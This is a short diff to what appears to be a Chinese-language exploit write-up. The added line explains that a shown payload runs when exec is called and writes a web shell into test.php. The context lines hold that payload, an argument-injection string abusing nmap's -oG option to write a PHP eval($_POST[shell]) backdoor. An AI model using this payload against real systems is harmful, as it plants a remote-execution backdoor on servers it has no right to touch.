@@ -34,5 +34,7 @@ Payload：
 \\' '\<\?php eval\(\$_POST\[shell\]\)\;\?\> -oG test.php \\''
 ```
 
+即在exec命令时进行执行，将马写入test.php中
+
 
 
